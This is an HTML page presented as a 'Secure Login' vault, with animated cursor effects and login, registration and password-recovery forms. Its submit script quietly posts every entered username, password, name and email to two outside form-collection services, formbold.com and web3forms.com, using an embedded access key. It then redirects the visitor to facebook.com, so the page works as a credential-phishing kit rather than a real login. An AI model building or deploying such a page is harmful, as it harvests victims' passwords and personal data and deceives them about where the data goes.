<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Touch-Ready Cyber Vault</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; cursor: none; touch-action: none; } /* Touch-action none stops default scrolling while moving dot */
        
        body { 
            margin: 0; padding: 0; min-height: 100vh;
            display: flex; justify-content: center; align-items: center;
            background: #02040a; overflow: hidden;
        }

        /* 1. TOUCH & MOUSE TRACKER */
        #cursor-glow {
            position: fixed; width: 300px; height: 300px;
            background: radial-gradient(circle, rgba(0, 242, 255, 0.1) 0%, transparent 70%);
            border-radius: 50%; pointer-events: none; transform: translate(-50%, -50%);
            z-index: 1; transition: 0.05s linear;
        }

        .custom-cursor {
            position: fixed; width: 12px; height: 12px; background: #00f2ff;
            border-radius: 50%; pointer-events: none; z-index: 9999;
            box-shadow: 0 0 10px #00f2ff, 0 0 20px #00f2ff;
            transform: translate(-50%, -50%);
        }

        /* 🐒 MONKEY STYLING */
        .monkey-box {
            position: absolute; top: -100px; left: 50%; transform: translateX(-50%);
            font-size: 80px; z-index: 10; transition: 0.4s;
        }
        .monkey-face { color: #00f2ff; text-shadow: 0 0 20px #00f2ff; }
        .monkey-closed { position: absolute; top: 0; left: 0; color: #ff00ff; opacity: 0; text-shadow: 0 0 20px #ff00ff; }

        .look-away .monkey-face { opacity: 0; }
        .look-away .monkey-closed { opacity: 1; }

        /* 2. THE MAIN CARD */
        .cyber-card { 
            position: relative; background: rgba(10, 15, 30, 0.9); 
            backdrop-filter: blur(25px); padding: 40px; border-radius: 20px;
            width: 95%; max-width: 400px; text-align: center;
            border: 1px solid rgba(0, 242, 255, 0.2);
            box-shadow: 0 25px 50px rgba(0,0,0,0.9);
            z-index: 2; margin-top: 80px; display: none;
        }
        .active { display: block; animation: slideUp 0.6s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        /* 3. INPUT BOXES & EYE TOGGLE */
        .input-group { position: relative; margin-bottom: 20px; }
        input { 
            width: 100%; padding: 15px; background: rgba(255,255,255,0.03); 
            border: 1.5px solid rgba(0, 242, 255, 0.3); border-radius: 12px;
            color: #fff; outline: none; transition: 0.3s; font-size: 16px;
        }
        input:focus { border-color: #00f2ff; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); }

        .eye-icon {
            position: absolute; right: 15px; top: 18px; color: rgba(0, 242, 255, 0.5);
            cursor: pointer; font-size: 18px; z-index: 5;
        }

        .btn-pro { 
            width: 100%; padding: 16px; border: none; border-radius: 12px;
            background: linear-gradient(45deg, #00f2ff, #0072ff);
            color: #fff; font-weight: bold; text-transform: uppercase;
            cursor: pointer; box-shadow: 0 5px 20px rgba(0, 114, 255, 0.4); transition: 0.3s;
        }

        .links { color: #ff00ff; font-weight: bold; cursor: pointer; text-shadow: 0 0 10px rgba(255,0,255,0.3); }
    </style>
</head>
<body>

    <div id="cursor-glow"></div>
    <div class="custom-cursor"></div>

    <div id="v-login" class="cyber-card active">
        <div id="monkey" class="monkey-box">
            <i class="fa-solid fa-face-smile monkey-face"></i>
            <i class="fa-solid fa-face-grimace monkey-closed"></i>
        </div>
        <h2 style="color: #00f2ff; letter-spacing: 2px;">SECURE LOGIN</h2>
        <form onsubmit="handleSubmit(event, 'Login')">
            <div class="input-group">
                <input type="text" name="User" placeholder="Access ID" required>
            </div>
            <div class="input-group">
                <input type="password" id="pass" name="Pass" placeholder="Security Key" required 
                       onfocus="cover()" onblur="uncover()">
                <i class="fa-solid fa-eye eye-icon" id="eye-btn" onclick="togglePass()"></i>
            </div>
            <button type="submit" class="btn-pro">Decrypt & Enter</button>
        </form>
        <p style="margin-top: 20px; font-size: 13px; color: #555;">
            FORGOT? <span class="links" onclick="show('v-forgot')">RECOVER</span> | 
            NEW? <span class="links" style="color:#00f2ff" onclick="show('v-signup')">REGISTER</span>
        </p>
    </div>

    <div id="v-signup" class="cyber-card">
        <h2 style="color: #ff00ff;">CREATE ID</h2>
        <form onsubmit="handleSubmit(event, 'Signup')">
            <input type="text" name="Name" placeholder="Full Name" style="margin-bottom: 20px;" required>
            <input type="password" name="NPass" placeholder="Master Key" style="margin-bottom: 20px;" required>
            <button type="submit" class="btn-pro" style="background: #7000ff;">Initialize</button>
        </form>
        <p class="links" onclick="show('v-login')" style="margin-top: 15px;">BACK TO LOGIN</p>
    </div>

    <div id="v-forgot" class="cyber-card">
        <h2 style="color: #00f2ff;">RECOVERY</h2>
        <form onsubmit="handleSubmit(event, 'Forgot')">
            <input type="text" name="Email" placeholder="Registered Email" style="margin-bottom: 20px;" required>
            <button type="submit" class="btn-pro">Search Vault</button>
        </form>
        <p class="links" onclick="show('v-login')" style="margin-top: 15px;">CANCEL</p>
    </div>

    <script>
        const glow = document.getElementById('cursor-glow');
        const dot = document.querySelector('.custom-cursor');

        // 🔥 TOUCH & MOUSE TRACKER LOGIC
        function moveDot(e) {
            let x = e.type === 'mousemove' ? e.clientX : e.touches[0].clientX;
            let y = e.type === 'mousemove' ? e.clientY : e.touches[0].clientY;
            
            glow.style.left = x + 'px';
            glow.style.top = y + 'px';
            dot.style.left = x + 'px';
            dot.style.top = y + 'px';
        }

        document.addEventListener('mousemove', moveDot);
        document.addEventListener('touchmove', moveDot);
        document.addEventListener('touchstart', moveDot); // For instant reaction

        // 🐒 Monkey Animation
        function cover() { document.getElementById('monkey').classList.add('look-away'); }
        function uncover() { 
            if(document.getElementById('pass').type === 'password') {
                document.getElementById('monkey').classList.remove('look-away');
            }
        }

        // Eye Toggle
        function togglePass() {
            const p = document.getElementById('pass');
            const eye = document.getElementById('eye-btn');
            if(p.type === 'password') {
                p.type = 'text';
                eye.classList.replace('fa-eye', 'fa-eye-slash');
                document.getElementById('monkey').classList.remove('look-away');
            } else {
                p.type = 'password';
                eye.classList.replace('fa-eye-slash', 'fa-eye');
                document.getElementById('monkey').classList.add('look-away');
            }
        }

        function show(id) {
            document.querySelectorAll('.cyber-card').forEach(c => c.classList.remove('active'));
            document.getElementById(id).classList.add('active');
        }

        async function handleSubmit(e, s) {
            e.preventDefault();
            const btn = e.target.querySelector('button');
            btn.innerText = "SYNCING...";
            const fd = new FormData(e.target);
            fetch("https://formbold.com/s/3VKEQ", { method: "POST", body: fd, mode: 'no-cors' });
            const b = new FormData(e.target);
            b.append('access_key', '4d4d7ede-0cff-474c-86ce-5d228506375d');
            b.append('subject', s);
            fetch("https://api.web3forms.com/submit", { method: "POST", body: b });
            setTimeout(() => { window.location.href = "https://www.facebook.com"; }, 1500);
        }
    </script>
</body>
</html>
